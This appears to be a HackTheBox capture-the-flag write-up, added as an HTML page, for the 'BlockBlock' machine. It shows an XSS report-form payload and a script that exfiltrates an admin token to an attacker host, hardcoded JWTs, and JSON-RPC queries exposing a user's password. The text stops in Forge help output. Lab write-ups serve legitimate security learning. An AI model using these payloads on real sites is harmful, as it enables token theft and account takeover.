@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlockBlock - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for BlockBlock machine from HackTheBox - Hard difficulty level">
+    <meta name="keywords" content="HackTheBox, BlockBlock, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">BlockBlock</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty hard">Hard</span>
+            <span class="date">March 29, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="pwned" src="../images/BlockBlock/pwned.png" /></p>
+<p>BlockBlock was a super fun box that combined web exploitation, blockchain security and privilege escalation in a unique way. The challenge began with a chat application using Ethereum smart contracts, requiring careful inspection of the blockchain's transaction history. Initial access was gained through an XSS vulnerability in a report form, which allowed token theft and obtaining admin privileges. From there, discovering an exposed JSON-RPC port led to extracting a user's login credentials directly from blockchain logs.</p>
+<p>Privilege escalation involved abusing Forge, a Solidity development tool, to execute arbitrary commands as another user. Finally, root access was achieved via Pacman abuse, where a malicious package installation granted a SUID bash shell. The combination of web, blockchain and Linux privesc techniques made this a unique and rewarding challenge!</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/BlockBlock/nmap.png" /></p>
+<p>Initial nmap reveals 3 open ports. SSH, HTTP and a werkzeug service...?</p>
+<p>I'll check the website first.</p>
+<p><img alt="homepage" src="../images/BlockBlock/homepage.png" /></p>
+<p>Its a chat app... But with blockchain technology? This might be tough for me as I have zero experience with blockchains, but I'll try my best!</p>
+<p>Chat and profile pages require a cookie to access, so I'll register an account first.</p>
+<p><img alt="chat" src="../images/BlockBlock/chat.png" /></p>
+<p>There's a bot on this page. I tried sending some XSS payloads in my messages, but they were all displayed as text.</p>
+<p><img alt="smartcontracts" src="../images/BlockBlock/smartcontracts.png" /></p>
+<p>There are also two smart contracts. Not very interesting, aside from...</p>
+<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">updateRole(string calldata username, string calldata role) public onlyOwner onlyExistingUser</span><span class="p">(</span>username<span class="p">)</span>
+</code></pre></div>
+
+<p>If I get ahold of the owner address, I could potentially give myself an admin role. I dont know if thats possible for now, so I'll keep looking through the website.</p>
+<h2>XSS in the report form</h2>
+<p>There is a basic report form that accepts an username. When I put an XSS payload there, I got a callback!</p>
+<div class="codehilite"><pre><span></span><code>&lt;img src=http://10.10.X.X&gt;` 
+</code></pre></div>
+
+<p><img alt="XSS" src="../images/BlockBlock/XSS.png" /></p>
+<p>Getting cookies was not possible, but thanks to the community, I found a way to get an admin token!</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nt">script</span><span class="p">.</span><span class="nc">js</span>
+
+<span class="nt">fetch</span><span class="o">(</span><span class="s1">&#39;/api/info&#39;</span><span class="o">)</span>
+<span class="w">    </span><span class="p">.</span><span class="nc">then</span><span class="o">(</span><span class="nt">response</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">response</span><span class="p">.</span><span class="nc">text</span><span class="o">())</span>
+<span class="w">    </span><span class="p">.</span><span class="nc">then</span><span class="o">(</span><span class="nt">text</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="err">fetch(&#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">/</span><span class="n">log</span><span class="o">?</span><span class="s1">&#39; + btoa(text), { mode: &#39;</span><span class="n">no-cors</span><span class="err">&#39;</span><span class="p">}</span><span class="o">);</span>
+<span class="err">}</span><span class="o">);</span>
+</code></pre></div>
+
+<p>And in the report form:</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="n">x</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="s2">&quot;var script = document.createElement(&#39;script&#39;); script.src = &#39;http://IP/script.js&#39;; document.body.appendChild(script);&quot;</span><span class="w"> </span><span class="o">/&gt;</span>
+</code></pre></div>
+
+<p><img alt="result" src="../images/BlockBlock/result.png" /></p>
+<div class="codehilite"><pre><span></span><code># Base64 token decoded
+
+{&quot;role&quot;:&quot;admin&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0Mjg3NzY2MCwianRpIjoiMWM2NGRlMzMtYmZlNi00M2FiLWEzNzAtMjZkNjc4Y2U0NDBkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQyODc3NjYwLCJleHAiOjE3NDM0ODI0NjB9.AADKjo-eLm9pa5qkAlhnO6dZhlRMPg7v0rggvD0OFtE&quot;,&quot;username&quot;:&quot;admin&quot;}
+</code></pre></div>
+
+<p>After inputting the token into the cookies field (in the web inspector), I am admin!</p>
+<p><img alt="admin" src="../images/BlockBlock/admin.png" /></p>
+<h2>Discovering an open JSON-RPC port</h2>
+<p>On the admin dashboard, I can see that there is an user named "Keira".</p>
+<p><img alt="Keira" src="../images/BlockBlock/keira.png" /></p>
+<p>Aside from that, there isnt much. I'll have to look somewhere else for a way forward.</p>
+<p>I searched for information regarding ethereum and its API usage, and stumbled upon a few interesting things.</p>
+<div class="codehilite"><pre><span></span><code>https://ethereum.github.io/execution-apis/api-documentation/
+</code></pre></div>
+
+<p>The documentation, as well as an unfamiliar to me protocol. I researched more about JSON-RPC and found out that runs on port 8545 by default. The exact same port as the one found in the nmap scan!</p>
+<p><img alt="auth" src="../images/BlockBlock/auth.png" /></p>
+<div class="codehilite"><pre><span></span><code>curl http://10.10.11.43:/api/json-rpc -b &quot;token=&#39;token field from the decoded JWT&#39;&quot;
+
+Response:
+
+{&quot;Authorization&quot;:&quot;&#39;token&#39;&quot;}
+</code></pre></div>
+
+<p>After sending a request to the JSON-RPC endpoint, I received an authorization token. I may be able to run more commands If I append it to my requests.</p>
+<p>I managed to succesfully call the eth_blockNumber method, but I could not get any of the others to work with curl. Luckily, I found and edited a script that solved the issue entirely and allowed me to fully interact with the endpoint.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">rhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10.10.11.43&#39;</span>
+<span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s1">&#39;</span>
+<span class="n">lhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10.10.16.25&#39;</span>
+
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="s2">&quot;&lt;img src=x onerror=</span><span class="se">\&quot;</span><span class="s2">fetch(&#39;/api/update_role&#39;, {method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;}, &quot;</span>
+<span class="w">    </span><span class="s2">&quot;body: JSON.stringify({ &#39;username&#39;: &#39;user&#39;, &#39;role&#39;: &#39;admin&#39;})})</span><span class="se">\&quot;</span><span class="s2"> /&gt;&quot;</span>
+<span class="p">)</span>
+<span class="n">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span>
+<span class="p">}</span>
+<span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Logging in and sending payload to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">login_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/api/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pass&quot;</span><span class="p">})</span>
+<span class="k">if</span><span class="w"> </span><span class="n">login_response</span><span class="o">.</span><span class="n">status_code</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="p">:</span>
+<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Login successful. Injecting primary payload.&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;role&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span>
+<span class="w">                </span><span class="s2">&quot;token&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0Mjg5NjIwOSwianRpIjoiMWEzM2U4YTAtNWI1Ny00MDM5LWI5ZWQtMjdlN2Q0ZDJjODhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImdyciIsIm5iZiI6MTc0Mjg5NjIwOSwiZXhwIjoxNzQzNTAxMDA5fQ.xhEBP6Vlb6WrSuYNxqCLb2Y07kU7702ZjyqTIGkDsY8&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="n">jwt_secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;d549ada4bcee1df9e9a52008125a7c70a0d1e291365b91dc3374b2604495b3e9&quot;</span><span class="p">}</span>
+<span class="n">chat_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/api/json-rpc&quot;</span>
+<span class="n">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;token&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">jwt_secret</span><span class="p">[</span><span class="s2">&quot;Authorization&quot;</span><span class="p">],</span>
+<span class="p">}</span>
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="p">}</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
+</code></pre></div>
+
+<p>I can swap payloads accordingly to my desired method. I'll try the same method, formatting the payload just like in the documentation.</p>
+<h2>Getting Keira's password</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># eth_blockNumber returned &#39;0xe&#39; as value, but I&#39;ll try to grab the earliest possible block first</span>
+
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getBlockByNumber&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">False</span><span class="p">],</span>
+<span class="w">    </span><span class="s2">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><img alt="eth1" src="../images/BlockBlock/eth1.png" /></p>
+<p>Success! Now that I've confirmed for 100% that this works, I'll try some different methods as well.</p>
+<p>This time, I'll try the eth_getLogs method.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getLogs&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
+<span class="w">        </span><span class="s2">&quot;fromBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;toBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span>
+<span class="w">    </span><span class="p">}],</span>
+<span class="w">    </span><span class="s2">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><img alt="eth2" src="../images/BlockBlock/eth2.png" /></p>
+<p>There are two data fields, with something encoded within. I'll use cyberchef to decode those from hex.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">field1</span><span class="o">:</span><span class="w"> </span><span class="n">keira</span>
+
+<span class="n">field2</span><span class="o">:</span><span class="w"> </span><span class="n">test</span><span class="o">(</span><span class="n">my</span><span class="w"> </span><span class="n">user</span><span class="o">)</span>
+</code></pre></div>
+
+<p>Keira is an actual user, as seen from the administrator's dashboard. There is also a single transaction address listed in the first block. I'll use a different method to check what it is.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionByHash&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281&quot;</span><span class="p">],</span>
+<span class="w">    </span><span class="s2">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><img alt="eth3" src="../images/BlockBlock/eth3.png" /></p>
+<p>I was left with a giant load of numbers, which hid something of great value inside!</p>
+<p><img alt="Decoding with cyberchef" src="../images/BlockBlock/cyberchef.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">keira</span><span class="o">:</span><span class="n">SomedayBitCoinWillCollapse</span>
+</code></pre></div>
+
+<p>Keira's credentials were at the bottom, hidden within a mass of gibberish and broken characters.</p>
+<p>I'll try to SSH into the box as Keira...</p>
+<p><img alt="user" src="../images/BlockBlock/user.png" /></p>
+<h1>Root flag</h1>
+<p>In the reverse-proxy directory, I found a main.py file. It is what was taking my blockchain-related requests from earlier.</p>
+<p>Inside the file, I found something interesting.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;method&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;eth_blockNumber&quot;</span><span class="p">:</span>
+<span class="w">    </span><span class="n">try</span><span class="p">:</span>
+<span class="w">        </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
+<span class="w">            </span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s2">&quot;token&quot;</span><span class="p">],</span><span class="w"> </span><span class="n">jwt_secret</span><span class="p">,</span><span class="w"> </span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HS256&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="p">)</span>
+<span class="w">    </span><span class="n">except</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">e</span><span class="p">:</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Proxy Couldn&#39;t verify token&quot;</span><span class="p">},</span><span class="w"> </span><span class="mi">401</span>
+</code></pre></div>
+
+<p>The proxy deliberately allows the unauthenticated use of eth_blockNumber. That explains why this particular method was usable by curl and why the others have thrown the 401 error.</p>
+<h2>Keira to Paul escalation</h2>
+<p><img alt="Keira's permissions on the box" src="../images/BlockBlock/keirasudo.png" /></p>
+<p>I'll run the command as Paul, just to see what Im dealing with.</p>
+<p><img alt="Forge help menu" src="../images/BlockBlock/forgehelp.png" /></p>
+<p>I ran the same command, this time with init.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">Create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Forge</span><span class="w"> </span><span class="n">project</span><span class="w">                                                                                                                                                                                                                  </span>
+
+<span class="k">Usage</span><span class="err">:</span><span class="w"> </span><span class="n">forge</span><span class="w"> </span><span class="n">init</span><span class="w"> </span><span class="o">[</span><span class="n">OPTIONS</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">PATH</span><span class="o">]</span><span class="w">                                                                                                                                                                                                          </span>
+
+<span class="nl">Arguments</span><span class="p">:</span><span class="w">                                                                                                                                                                                                                                  </span>
+<span class="w">  </span><span class="o">[</span><span class="n">PATH</span><span class="o">]</span><span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">project</span><span class="w"> </span><span class="o">[</span><span class="n">default: .</span><span class="o">]</span>
+
+<span class="nl">Options</span><span class="p">:</span>
+<span class="w">  </span><span class="o">-</span><span class="n">t</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">template</span><span class="w"> </span><span class="o">&lt;</span><span class="n">TEMPLATE</span><span class="o">&gt;</span><span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">start</span><span class="w"> </span><span class="k">from</span>
+<span class="w">  </span><span class="o">-</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">branch</span><span class="w"> </span><span class="o">&lt;</span><span class="n">BRANCH</span><span class="o">&gt;</span><span class="w">      </span><span class="n">Branch</span><span class="w"> </span><span class="n">argument</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">only</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="k">option</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">specified</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">used</span>
+<span class="w">      </span><span class="o">--</span><span class="n">offline</span><span class="w">              </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">dependencies</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">network</span><span class="w"> </span><span class="o">[</span><span class="n">aliases: no-deps</span><span class="o">]</span>
+<span class="w">      </span><span class="o">--</span><span class="n">force</span><span class="w">                </span><span class="k">Create</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">project</span><span class="w"> </span><span class="n">even</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">empty</span>
+<span class="w">      </span><span class="o">--</span><span class="n">vscode</span><span class="w">               </span><span class="k">Create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="p">.</span><span class="n">vscode</span><span class="o">/</span><span class="n">settings</span><span class="p">.</span><span class="n">json</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">Solidity</span><span class="w"> </span><span class="n">settings</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">remappings</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="k">file</span>
+<span class="w">      </span><span class="o">--</span><span class="n">shallow</span><span class="w">              </span><span class="n">Perform</span><span class="w"> </span><span class="n">shallow</span><span class="w"> </span><span class="n">clones</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">deep</span><span class="w"> </span><span class="n">ones</span>
+<span class="w">      </span><span class="o">--</span><span class="k">no</span><span class="o">-</span><span class="n">git</span><span class="w">               </span><span class="n">Install</span><span class="w"> </span><span class="k">without</span><span class="w"> </span><span class="n">adding</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">dependency</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">submodule</span>
+<span class="w">      </span><span class="o">--</span><span class="k">no</span><span class="o">-</span><span class="k">commit</span><span class="w">            </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">commit</span>
+<span class="w">  </span><span class="o">-</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">quiet</span><span class="w">                </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">print</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">messages</span>
+<span class="w">  </span><span class="o">-</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="c1">--help                 Print help (see more with &#39;--help&#39;)</span>
+</code></pre></div>
+
+<p>I can create a new project as Paul. There was also a build command, so I'll check it out too before deciding on a plan.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Build</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">project</span><span class="s1">&#39;s smart contracts</span>
+
+<span class="n">Usage</span><span class="p">:</span><span class="w"> </span><span class="n">forge</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span>
+
+<span class="n">Options</span><span class="p">:</span>
+<span class="w">  </span><span class="o">-</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">help</span><span class="w">  </span><span class="n">Print</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="p">(</span><span class="n">see</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="s1">&#39;--help&#39;</span><span class="p">)</span>
+
+<span class="n">Build</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">      </span><span class="o">--</span><span class="n">names</span><span class="w">           </span><span class="n">Print</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">contract</span><span class="w"> </span><span class="n">names</span>
+<span class="w">      </span><span class="o">--</span><span class="n">sizes</span><span class="w">           </span><span class="n">Print</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">contract</span><span class="w"> </span><span class="n">sizes</span>
+<span class="w">      </span><span class="o">--</span><span class="n">skip</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SKIP</span><span class="o">&gt;...</span><span class="w">  </span><span class="n">Skip</span><span class="w"> </span><span class="n">building</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">whose</span><span class="w"> </span><span class="n">names</span><span class="w"> </span><span class="n">contain</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">given</span><span class="w"> </span><span class="n">filter</span>
+<span class="w">      </span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="w">        </span><span class="n">Disable</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cache</span>
+
+<span class="n">Cache</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">      </span><span class="o">--</span><span class="n">force</span><span class="w">  </span><span class="n">Clear</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">artifacts</span><span class="w"> </span><span class="n">folder</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">recompile</span>
+
+<span class="n">Linker</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">      </span><span class="o">--</span><span class="n">libraries</span><span class="w"> </span><span class="o">&lt;</span><span class="n">LIBRARIES</span><span class="o">&gt;</span><span class="w">  </span><span class="n">Set</span><span class="w"> </span><span class="n">pre</span><span class="o">-</span><span class="n">linked</span><span class="w"> </span><span class="n">libraries</span><span class="w"> </span><span class="p">[</span><span class="n">env</span><span class="p">:</span><span class="w"> </span><span class="n">DAPP_LIBRARIES</span><span class="o">=</span><span class="p">]</span>
+
